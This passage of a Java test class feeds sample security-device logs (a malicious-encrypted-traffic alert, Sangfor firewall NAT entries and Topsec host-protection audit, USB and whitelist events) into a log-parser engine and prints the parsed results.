      data = "2021-06-11T09: 03: 00.855Z 172.16.1.247 notice {\"conn\": {\"duration\": \"836.329329\",\"resp_bytes\": \"542631\",\"resp_pkts\": \"451\",\"orig_bytes\": \"31481\",\"conn_state\": \"SF\",\"orig_pkts\": \"225\"},\"kill_chain\": \"remote-control\",\"dst_ip_geoloc\": \"48.6907,8.9707\",\"victim_geoloc\": \"41.8056,123.4324\",\"hostip\": \"172.16.1.101\",\"dst_ip_country_code\": \"DE\",\"event_source\": \"NDE\",\"rid\": \"20290002\",\"uuid\": \"66957394-fced-4b2e-9573-94fceddb2e79\",\"ssl\": {\"cipher\": \"Server::  TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA\\nClient::  TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,TLS_ECDHE_RSA_WITH_RC4_128_SHA,TLS_DHE_RSA_WITH_AES_128_CBC_SHA,TLS_DHE_DSS_WITH_AES_128_CBC_SHA,TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA,TLS_DHE_RSA_WITH_AES_256_CBC_SHA,TLS_DHE_DSS_WITH_AES_256_CBC_SHA,TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA,TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_AES_128_CBC_SHA,TLS_RSA_WITH_CAMELLIA_128_CBC_SHA,TLS_RSA_WITH_AES_256_CBC_SHA,TLS_RSA_WITH_CAMELLIA_256_CBC_SHA,TLS_RSA_WITH_3DES_EDE_CBC_SHA,TLS_RSA_WITH_RC4_128_SHA,TLS_RSA_WITH_RC4_128_MD5,TLS_EMPTY_RENEGOTIATION_INFO_SCSV\",\"JA3_server_hash\": \"f0c0b894534c50544ec36396c911a9df\",\"server_name\": \"www.fbncs36gptf6b.com\",\"chain\": \"\",\"notAfter\": \"2016-07-06T23:59:59\",\"SSL_server_cert_days\": \"138\",\"curve\": \"\",\"subject\": \"Server::  CN=www.ynjplotp.net\\n\",\"SSL_server_cert_subna\": \"\",\"certificate\": \"MIIBtTCCAR6gAwIBAgIJAI7cEC0PmAy/MA0GCSqGSIb3DQEBBQUAMB4xHDAaBgNVBAMTE3d3dy50ZzViYnpiNWwzdS5jb20wHhcNMTYwMjE5MDAwMDAwWhcNMTYwNzA2MjM1OTU5WjAbMRkwFwYDVQQDExB3d3cueW5qcGxvdHAubmV0MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDInrOuU5nE9gYMEaOJAYz/DiDASAfOQqDF+2oHxACro1BjChUn8S2EoixT8wYxNtZ6ne7xoThnOWGkcdm0zOegN8Fx9LacRwMShAOleLYLJPXFT8MBgQl/tF5YCEXI1yAePZh9x7GsUthwuhjKc6QiK4g0XYKRZEyy7bDUDhhu0wIDAQABMA0GCSqGSIb3DQEBBQUAA4GBAHAMpNQuJwv2cBVnLdKjWcaCbqCmx2Ec/eP0w6Ltgts1MA4XEgFNDM2qEzk59Ggaykj2x+eGbdflFgvnWglAJIZT/6VWC0RJ/8TVA3BLNpXUXw3RHwn9ykrsnrhNk01Q5rCjzrCMtIyEJlFZGd1qhuktTxWVVTYdJYp2g7r6TWuX\",\"version\": \"TLS 1.1\",\"notBefore\": \"2016-02-19T00:00:00\",\"issuer\": \"Server::  CN=www.tg5bbzb5l3u.com\\n\",\"extensions\": \"Server::  renegotiation_info,ec_point_formats,heartbeat\\nClient::  server_name,ec_point_formats,supported_groups,SessionTicket TLS,signature_algorithms,heartbeat\",\"ssl_state\": \"client_hello,server_hello,client_keyx,server_keyx\",\"cert_check_ret\": \"The certificate is not trusted\",\"serial\": \"00:8E:DC:10:2D:0F:98:0C:BF\",\"SSL_server_hash\": \"143e3e69d1ddd274d757f2fb60394e3bb2d83494\",\"expired_cert\": \"\",\"JA3_client_hash\": \"2d8794cb7b52b777bee2695e79c15760\",\"self_signed\": \"F\"},\"number\": 1,\"hostname\": \"ATD\",\"enrichments.src_ip.host_type\": \"2\",\"payload\": \"RVRBIOaBtuaEj+WKoOWvhua1gemHj+mAmuS/oeaooeWei+WRveS4re+8jOaUu+WHu+eJueW+geWcqOWRiuitpueahGNvbm4vc3Ns5a2X5q615LiK44CC5ZG95Lit55qE5oOF5oql5pivOiBKQTNfY2xpZW50X2hhc2g6OiAyZDg3OTRjYjdiNTJiNzc3YmVlMjY5NWU3OWMxNTc2MA==\",\"commid\": \"1:1RWiHbDNp5nGP9X+W0ZCiNOehY8=\",\"enrichments.victim.in_range\": 1,\"victim_city\": \"沈阳市\",\"dst_ip_country\": \"Germany\",\"victim_country_code\": \"CN\",\"enrichments.src_ip.host_group\": \"Default Terminal Group\",\"proto\": \"tcp\",\"enrichments.src_ip.malicious\": \"2\",\"victim_port\": \"59279\",\"desc\": \"\",\"sub_category\": \"Malicious encrypted traffic communication\",\"src_ip_city\": \"沈阳市\",\"visit_direction_detail\": \"12\",\"reliability\": 9,\"classtype\": \"malicious-encrypted-traffic\",\"increment\": 1,\"interface\": \"pcap;tor_tls11.77071560f65340cb9623e204920db72b.pcap\",\"dst_ip\": \"213.239.216.222\",\"enrichments.dst_ip.malicious\": \"1\",\"src_ip\": \"10.0.2.15\",\"dst_ip_city\": \"Böblingen\",\"victim\": \"10.0.2.15\",\"sensor_ip\": \"172.16.1.101\",\"visit_direction\": \"1\",\"timestamp\": \"1623402176543\",\"severity\": 3,\"enrichments.src_ip.in_range\": 1,\"victim_country\": \"China\",\"attacker\": \"\",\"message\": \"Malicious encrypted traffic with ssl uncorrelated and bidirectional traffic\",\"app_proto\": \"ssl\",\"target\": \"\",\"src_port\": \"59279\",\"attacker_port\": \"\",\"engine_type\": \"ai\",\"src_ip_country_code\": \"CN\",\"dst_port\": \"443\",\"src_ip_geoloc\": \"41.8056,123.4324\",\"src_ip_country\": \"China\",\"family\": \"Malware (own)\",\"category\": \"encrypted-traffic-analysis-traffic\",\"resp_data\": \"\",\"ts\": \"1456334371.511\",\"sensor_name\": \"ATD\"}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //深信服防火墙
  public void testFirewallSangfor() {
    String parserFile = "./resources/parsers/firewall_sangfor_ngaf[7.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<134>Dec  6 15:03:14 localhost nat: 日志类型:NAT日志, NAT类型:snat, 源IP:192.168.0.77, 源端口:3678, 目的IP:144.80.30.70, 目的端口:5803, 协议:6, 转换后的IP:10.105.130.125, 转换后的端口:3678";
      parse(botuEngine, data);
      data = "<134>Aug  9 23:59:58 sfos-x86_64 fwlog[714592]: 所属系统:public, 日志类型:服务控制或应用控制, 策略名称:应用控制策略, 用户:(null), 源IP:122.97.220.173, 源端口:9446, 目的IP:192.168.10.123, 目的端口:9024, 应用类型:any, 应用名称:, 系统动作:允许";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //天融信工控主机卫士
  public void testEPSTopicIHS() {
    String parserFile = "./resources/parsers/eps_topsec_ihs[3.1.0.121]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<140>id=\"9751\" agentid=\"172.19.23.92\" logtype=\"SERVERPERFORMANCE\" logtime=\"2021-01-29 05:49:38\" action=\"内存空间预警\" object_class=\"172.19.23.92\" object_name=\"内存空间\" objectinfo=\" \t\t<内存空间>15886.10MB</内存空间> \t\t<内存占用>4058.85MB</内存占用> \t\t<报警阈值百分比>2%</报警阈值百分比> \t\t<报警阈值>317.72MB</报警阈值>\" reason=\"所用内存空间大小为4058.85MB，已大于设定的阈值(2%)\" loglevel=\"警告\" handle=\"报警\" result=\"成功\" subject=\"<日志类型>服务器</日志类型><服务器IP>172.19.23.92</服务器IP>\" subject_name=\"172.19.23.92\" subject_class=\"服务器\" agentip=\"172.19.23.92\" ipcode=\"\" agentmac=\"\" depart=\"系统报警\" username=\"系统报警\" agentversion=\"\" cid=\"服务性能.服务器.检测.内存.报警\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "<140>id=\"14932\" agentid=\"172.19.23.92\" logtype=\"SERVERPERFORMANCE\" logtime=\"2021-02-02 11:00:25\" action=\"磁盘空间预警\" object_class=\"172.19.23.92\" object_name=\"磁盘空间\" objectinfo=\" \t\t<磁盘空间>45030.00MB</磁盘空间> \t\t<磁盘使用>7060.63MB</磁盘使用> \t\t<报警阈值百分比>1%</报警阈值百分比> \t\t<报警阈值>450.30MB</报警阈值>\" reason=\"所用磁盘空间大小为7060.63MB，已大于设定的阈值(1%)\" loglevel=\"警告\" handle=\"报警\" result=\"成功\" subject=\"<日志类型>服务器</日志类型><服务器IP>172.19.23.92</服务器IP>\" subject_name=\"172.19.23.92\" subject_class=\"服务器\" agentip=\"172.19.23.92\" ipcode=\"\" agentmac=\"\" depart=\"系统报警\" username=\"系统报警\" agentversion=\"\" cid=\"服务性能.服务器.检测.磁盘.报警\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "id=\"15\" agentid=\"192.168.16.158\" logtype=\"USER\" logtime=\"2021-02-02 16:17:07\" action=\"错误密码操作过多预警\" object_class=\"172.19.12.56\" object_name=\"错误密码操作过多\" objectinfo=\"<用户登陆>用户登陆</用户登陆><密码错误次数>3</密码错误次数>\" reason=\"错误密码登陆次数过多,超过3次,test该用户受到限制,禁止登陆\" loglevel=\"警告\" handle=\"禁止\" result=\"已禁止登陆\" subject=\"<日志类型>服务器</日志类型><服务器IP>172.19.12.56</服务器IP>\" subject_name=\"172.19.12.56\" subject_class=\"服务器\" agentip=\"192.168.16.158\" ipcode=\"\" agentmac=\"\" depart=\"/topsec\" username=\"test\" agentversion=\"\" cid=\"用户登陆.服务器.检测.错误密码操作过多预警.报警\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "id=\"1\" agentid=\"192.168.16.158\" logtype=\"USERIP\" logtime=\"2020-03-16 13:28:51\" action=\"IP网关预警\" object_class=\"172.19.12.56\" object_name=\"IP网关\" objectinfo=\"<IP网关>IP网关预警</IP网关><IP>172.19.12.56</IP>\" reason=\"用户IP:192.168.16.158受到限制,禁止登陆\" loglevel=\"警告\" handle=\"禁止\" result=\"已禁止登陆\" subject=\"<日志类型>服务器</日志类型><服务器IP>172.19.12.56</服务器IP>\" subject_name=\"172.19.12.56\" subject_class=\"服务器\" agentip=\"192.168.16.158\" ipcode=\"\" agentmac=\"\" depart=\"\" username=\"auditadm\" agentversion=\"\" cid=\"用户登陆.服务器.检测.IP受到限制.报警\" is_send=\"0\"";
      parse(botuEngine, data);
      data = "id=\"17\" agentid=\"D8F0C5C0-71B0-62E7-260E-DA5375ABCBFF\" logtype=\"ADP\" logtime=\"2021/02/02 15:44:05\" action=\"新建\" object_class=\"业务文件\" object_name=\"C:\\111112\\XMLView64_v6.0.0.0.exe\" objectinfo=\"<File><路径>C:\\111112\\XMLView64_v6.0.0.0.exe</路径></File>\" reason=\"因策略限制，操作失败\" loglevel=\"6\" handle=\"禁止\" result=\"已阻断\" subject=\"<pid>1524</pid><计算机>HP-PC</计算机><用户账号>hp-PC\\hp</用户账号><进程路径>C:\\Windows\\Explorer.EXE</进程路径>\" subject_name=\"explorer.exe\" subject_class=\"进程\" trigger_type=\"策略\" trigger_name=\"应用防护\" trigger_text=\"0x2719\" event_from=\"tdsvc.adp\" event_id=\"\" agentip=\"172.16.26.154\" ipcode=\"-1408230758\" agentmac=\"00-0C-29-30-E0-30\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"应用防护日志.进程.新建.业务文件.禁止.已阻断\" is_send=\"0\" sourceserverip=\"172.19.12.56\"";
      parse(botuEngine, data);
      data = "<140>id=\"27690\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"AUDIT\" logtime=\"2021/02/02 11:15:55\" action=\"登录\" object_class=\"账号\" object_name=\"Operator\" objectinfo=\"已登录\" reason=\"\" loglevel=\"\" handle=\"\" result=\"成功\" subject=\"\" subject_name=\"Operator\" subject_class=\"操作员\" trigger_type=\"模块\" trigger_name=\"工控安全\" trigger_text=\"\" event_from=\"tdsvc.indsec\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"客户端审计日志.操作员.登录.账号..成功\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27691\" agentid=\"E1A445C7-F51A-530D-29B9-E14BC14F554D\" logtype=\"AUDIT\" logtime=\"2021/02/02 11:18:09\" action=\"登录\" object_class=\"账号\" object_name=\"Admin\" objectinfo=\"已登录\" reason=\"\" loglevel=\"\" handle=\"\" result=\"成功\" subject=\"\" subject_name=\"Admin\" subject_class=\"管理员\" trigger_type=\"模块\" trigger_name=\"工控安全\" trigger_text=\"\" event_from=\"tdsvc.indsec\" event_id=\"\" agentip=\"10.73.98.27\" ipcode=\"172581403\" agentmac=\"00-E0-4C-72-CE-7A\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"客户端审计日志.管理员.登录.账号..成功\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27692\" agentid=\"E1A445C7-F51A-530D-29B9-E14BC14F554D\" logtype=\"AUDIT\" logtime=\"2021/02/02 11:18:24\" action=\"修改密码\" object_class=\"账号\" object_name=\"Admin\" objectinfo=\"Admin\" reason=\"\" loglevel=\"\" handle=\"\" result=\"成功\" subject=\"\" subject_name=\"Admin\" subject_class=\"管理员\" trigger_type=\"模块\" trigger_name=\"工控安全\" trigger_text=\"\" event_from=\"tdsvc.indsec\" event_id=\"\" agentip=\"10.73.98.27\" ipcode=\"172581403\" agentmac=\"00-E0-4C-72-CE-7A\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"客户端审计日志.管理员.修改密码.账号..成功\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27693\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"AUDIT\" logtime=\"2021/02/02 11:28:10\" action=\"注销\" object_class=\"账号\" object_name=\"Operator\" objectinfo=\"退出管理界面\" reason=\"\" loglevel=\"\" handle=\"\" result=\"成功\" subject=\"\" subject_name=\"Operator\" subject_class=\"操作员\" trigger_type=\"模块\" trigger_name=\"工控安全\" trigger_text=\"\" event_from=\"tdsvc.indsec\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"客户端审计日志.操作员.注销.账号..成功\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27684\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"BOOTRECORD\" logtime=\"2021/02/02 11:05:49\" action=\"记录上一次异常关机\" object_class=\"时间\" object_name=\"2021/02/01 16:08:46\" objectinfo=\"<开机时间>2021/02/01 16:08:46</开机时间><最后运行时间>2021/02/01 16:08:46</最后运行时间>\" reason=\"\" loglevel=\"6\" handle=\"\" result=\"\" subject=\"<计算机>YUZIWEI-PC</计算机><用户账号></用户账号>\" subject_name=\"系统监控\" subject_class=\"模块\" trigger_type=\"模块\" trigger_name=\"系统监控\" trigger_text=\"\" event_from=\"tdsvc.sysmon\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"系统监控事件.模块.记录上一次异常关机.时间..\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27521\" agentid=\"D8A8A1E4-9AF6-4A07-0E02-A26A20FFFF73\" logtype=\"MONITORBOOT\" logtime=\"2021-02-02 10:24:13.000\" action=\"非指定时间开机\" object_class=\"开机监控\" object_name=\"非指定时间开机\" objectinfo=\"<客户端IP>192.168.111.128</客户端IP><开机时间>2021-02-02 10:24:13</开机时间><正常开机时间范围>18:18:23 ~ 20:18:26</正常开机时间范围>\" reason=\"用户在非指定时间段内(正常时间段为：18:18:23,20:18:26)开机\" loglevel=\"4\" handle=\"报警\" result=\"成功\" subject=\"<计算机>WYL-976C221B465</计算机>\" subject_name=\"WYL-976C221B465\" subject_class=\"终端\" trigger_type=\"策略\" trigger_name=\"非指定时间开机\" trigger_text=\"\" event_from=\"\" event_id=\"\" agentip=\"\" ipcode=\"0\" agentmac=\"\" depart=\"\" username=\"\" agentversion=\"\" cid=\"非指定时间段内开机报警事件.进程.开机.非指定时间段内开机.报警.成功\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "id=\"703\" agentid=\"F7D59B-6550-3A88-B945-CDCD154CD0F10E\" logtype=\"OSAUTH\" logtime=\"2020-03-16 12:42:51.573\" action=\"登录\" object_class=\"计算机\" object_name=\"kylin-os\" objectinfo=\"<日志内容><登录IP>192.168.16.166</登录IP><登录终端>ssh</登录终端><登录帐号>root</登录帐号><登录服务>sshd</登录服务><时间>2020-03-16 12:39:53</时间></日志内容>\" reason=\"\" loglevel=\"2\" handle=\"\" result=\"失败\" subject=\"<用户帐号>root</用户帐号><计算机>kylin-os</计算机>\" subject_name=\"root\" subject_class=\"用户\" trigger_type=\"策略\" trigger_name=\"日志监控\" trigger_text=\"\" event_from=\"tdasvc.logmon\" event_id=\"\" agentip=\"192.168.16.212\" ipcode=\"-1062727468\" agentmac=\"6C:92:BF:04:72:10\" depart=\"无部门\" username=\"无责任人\" agentversion=\"topdesk-3.0_2.1.261.191230.kylin_arm64.deb\" cid=\"身份鉴别日志.用户.登录.计算机..失败\" is_send=\"0\" sourceserverip=\"172.19.12.56\"";
      parse(botuEngine, data);
      data = "<140>id=\"27682\" agentid=\"E1A445C7-F51A-530D-29B9-E14BC14F554D\" logtype=\"PNP\" logtime=\"2021/02/02 11:01:49\" action=\"插入\" object_class=\"设备\" object_name=\"USB Attached SCSI (UAS) Mass Storage Device\" objectinfo=\"<Device><设备实例>USB\\VID_0BDA&amp;PID_9210\\MSFT30012345678902</设备实例><类GUID>{4d36e97b-e325-11ce-bfc1-08002be10318}</类GUID><类>USB SCSIAdapter</类><状态>启用</状态><设备描述>USB Attached SCSI (UAS) Mass Storage Device</设备描述><厂商>USB Attached SCSI (UAS) Compatible Device</厂商><硬件ID>USB\\VID_0BDA&amp;PID_9210&amp;REV_2001;USB\\VID_0BDA&amp;PID_9210;</硬件ID><兼容ID>USB\\Class_08&amp;SubClass_06&amp;Prot_62;USB\\Class_08&amp;SubClass_06;USB\\Class_08;</兼容ID><父系>USB\\VID_2109&amp;PID_0817\\5&amp;20653A1F&amp;0&amp;13</父系></Device>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"已放行\" subject=\"<用户账号>刘超</用户账号>\" subject_name=\"LAPTOP-9AHFHN7J\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"设备监控\" trigger_text=\"0xf9094\" event_from=\"tdsvc.devmon\" event_id=\"\" agentip=\"10.73.98.27\" ipcode=\"172581403\" agentmac=\"00-E0-4C-72-CE-7A\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"外设报警事件.计算机.插入.设备.允许.已放行\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27686\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"PNP\" logtime=\"2021/02/02 11:05:46\" action=\"删除\" object_class=\"设备\" object_name=\"UMBus Enumerator\" objectinfo=\"<Device><设备实例>UMB\\UMB\\1&amp;841921D&amp;0&amp;WPDBUSENUMROOT</设备实例><类GUID></类GUID><类>系统</类><状态>启用</状态><设备描述>UMBus Enumerator</设备描述><厂商>Microsoft</厂商><硬件ID>UMB\\UMBUS;</硬件ID><兼容ID></兼容ID><父系></父系></Device>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"已放行\" subject=\"<用户账号></用户账号>\" subject_name=\"YUZIWEI-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"设备监控\" trigger_text=\"0x4ef2\" event_from=\"tdsvc.devmon\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"外设报警事件.计算机.删除.设备.允许.已放行\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27688\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"PNP\" logtime=\"2021/02/02 11:05:46\" action=\"删除\" object_class=\"设备\" object_name=\"磁盘驱动器\" objectinfo=\"<Device><设备实例>USBSTOR\\DISK&amp;VEN_GENERIC&amp;PROD_FLASH_DISK&amp;REV_8.07\\7E7CF3E2&amp;0</设备实例><类GUID></类GUID><类>磁盘驱动器</类><状态>启用</状态><设备描述>磁盘驱动器</设备描述><厂商>(标准磁盘驱动器)</厂商><硬件ID>USBSTOR\\DiskGeneric_Flash_Disk______8.07;USBSTOR\\DiskGeneric_Flash_Disk______;USBSTOR\\DiskGeneric_;USBSTOR\\Generic_Flash_Disk______8;Generic_Flash_Disk______8;USBSTOR\\GenDisk;GenDisk;</硬件ID><兼容ID>USBSTOR\\Disk;USBSTOR\\RAW;</兼容ID><父系></父系></Device>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"已放行\" subject=\"<用户账号></用户账号>\" subject_name=\"YUZIWEI-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"设备监控\" trigger_text=\"0x4ef2\" event_from=\"tdsvc.devmon\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"外设报警事件.计算机.删除.设备.允许.已放行\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27685\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"PNP\" logtime=\"2021/02/02 11:05:46\" action=\"删除\" object_class=\"设备\" object_name=\"通用卷\" objectinfo=\"<Device><设备实例>STORAGE\\VOLUME\\_??_USBSTOR#DISK&amp;VEN_GENERIC&amp;PROD_FLASH_DISK&amp;REV_8.07#7E7CF3E2&amp;0#{53F56307-B6BF-11D0-94F2-00A0C91EFB8B}</设备实例><类GUID></类GUID><类>Volume</类><状态>启用</状态><设备描述>通用卷</设备描述><厂商>Microsoft</厂商><硬件ID>STORAGE\\Volume;</硬件ID><兼容ID></兼容ID><父系></父系></Device>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"已放行\" subject=\"<用户账号></用户账号>\" subject_name=\"YUZIWEI-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"设备监控\" trigger_text=\"0x4ef2\" event_from=\"tdsvc.devmon\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"外设报警事件.计算机.删除.设备.允许.已放行\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "<140>id=\"27689\" agentid=\"D8B85C6E-9C44-7CA2-1DC0-810614714D96\" logtype=\"PNP\" logtime=\"2021/02/02 11:05:46\" action=\"删除\" object_class=\"设备\" object_name=\"USB 大容量存储设备\" objectinfo=\"<Device><设备实例>USB\\VID_058F&amp;PID_6387\\7E7CF3E2</设备实例><类GUID></类GUID><类>USB</类><状态>启用</状态><设备描述>USB 大容量存储设备</设备描述><厂商>兼容 USB 存储设备</厂商><硬件ID>USB\\VID_058F&amp;PID_6387&amp;REV_0100;USB\\VID_058F&amp;PID_6387;</硬件ID><兼容ID>USB\\Class_08&amp;SubClass_06&amp;Prot_50;USB\\Class_08&amp;SubClass_06;USB\\Class_08;</兼容ID><父系></父系></Device>\" reason=\"\" loglevel=\"2\" handle=\"允许\" result=\"已放行\" subject=\"<用户账号></用户账号>\" subject_name=\"YUZIWEI-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"设备监控\" trigger_text=\"0x4ef2\" event_from=\"tdsvc.devmon\" event_id=\"\" agentip=\"192.168.35.232\" ipcode=\"-1062722584\" agentmac=\"00-0C-29-98-79-32\" depart=\"/topsec/win7_64\" username=\"yuziwei\" agentversion=\"3.1.0.37B125\" cid=\"外设报警事件.计算机.删除.设备.允许.已放行\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
      data = "id=\"41\" agentid=\"D8F0C5C0-71B0-62E7-260E-DA5375ABCBFF\" logtype=\"UDEV\" logtime=\"2021/02/02 15:50:49\" action=\"插入\" object_class=\"U盘\" object_name=\"Kingston DataTraveler 2.0\" objectinfo=\"<插入时间>2021/2/2 15:50:49</插入时间><厂商>Kingston</厂商><型号>DataTraveler 2.0</型号><序列号>0</序列号><容量>28.82GB</容量>\" reason=\"\" loglevel=\"1\" handle=\"允许\" result=\"成功\" subject=\"<用户账号>hp</用户账号>\" subject_name=\"HP-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"移动存储安全\" trigger_text=\"0x271b\" event_from=\"tdsvc.tagdisk\" event_id=\"\" agentip=\"172.16.26.154\" ipcode=\"-1408230758\" agentmac=\"00-0C-29-30-E0-30\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"移动存储设备操作事件.计算机.插入.U盘.允许.成功\" is_send=\"0\" sourceserverip=\"172.19.12.56\"";
      parse(botuEngine, data);
      data = "id=\"48\" agentid=\"D8F0C5C0-71B0-62E7-260E-DA5375ABCBFF\" logtype=\"UFS\" logtime=\"2021/02/02 15:51:49\" action=\"新建\" object_class=\"文件\" object_name=\"新建文本文档.txt\" objectinfo=\"<File><磁盘类型>U盘</磁盘类型><磁盘ID></磁盘ID><路径>F:\\新建文本文档.txt</路径></File>\" reason=\"\" loglevel=\"6\" handle=\"允许\" result=\"成功\" subject=\"<pid>1524</pid><计算机>HP-PC</计算机><用户账号>hp-PC\\hp</用户账号><进程路径>C:\\Windows\\Explorer.EXE</进程路径>\" subject_name=\"explorer.exe\" subject_class=\"进程\" trigger_type=\"策略\" trigger_name=\"移动存储安全\" trigger_text=\"0x271b\" event_from=\"tdsvc.tagdisk\" event_id=\"\" agentip=\"172.16.26.154\" ipcode=\"-1408230758\" agentmac=\"00-0C-29-30-E0-30\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"移动存储文件操作事件.进程.新建.文件.允许.成功\" is_send=\"0\" sourceserverip=\"172.19.12.56\"";
      parse(botuEngine, data);
      data = "<140>id=\"27712\" agentid=\"E1A445C7-F51A-530D-29B9-E14BC14F554D\" logtype=\"WHITELIST\" logtime=\"2021/02/02 11:31:03\" action=\"执行\" object_class=\"可执行镜像\" object_name=\"vmPerfmon.dll\" objectinfo=\"<路径>E:\\VMware Workstation\\vmPerfmon.dll</路径>\" reason=\"非白名单\" loglevel=\"6\" handle=\"禁止\" result=\"已阻断\" subject=\"<pid>3952</pid><计算机>LAPTOP-9AHFHN7J</计算机><用户账号>NT AUTHORITY\\SYSTEM</用户账号><进程路径>C:\\Windows\\System32\\wbem\\WmiPrvSE.exe</进程路径>\" subject_name=\"WmiPrvSE.exe\" subject_class=\"进程\" trigger_type=\"策略\" trigger_name=\"白名单\" trigger_text=\"0x9eb17\" event_from=\"tdsvc.indsec\" event_id=\"\" agentip=\"10.73.98.27\" ipcode=\"172581403\" agentmac=\"00-E0-4C-72-CE-7A\" depart=\"无部门\" username=\"无责任人\" agentversion=\"3.1.0.37B125\" cid=\"业务数据防护日志.进程.执行.可执行镜像.禁止.已阻断\" is_send=\"0\" sourceserverip=\"172.19.23.92\"";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //天融信下一代入侵防御系统
  public void testIpsTopsecNgidp() {
    String parserFile = "./resources/parsers/ips_topsec_ngidp[3.2262]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
